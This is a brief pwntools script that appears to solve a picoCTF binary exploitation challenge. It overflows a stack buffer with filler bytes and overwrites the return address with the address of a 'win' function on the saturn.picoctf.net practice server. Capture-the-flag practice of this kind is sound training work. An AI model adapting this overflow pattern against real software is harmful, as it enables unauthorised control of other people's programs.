from pwn import *
win_addr = 0x00401530
payload = b'a' * 0x88
payload += b'a' * 4
payload += p32(win_addr)
port = int(input('port='))
r = remote('saturn.picoctf.net', port)
r.sendline(payload)
# interactive doesn't work here for some reason
print(r.recvall())
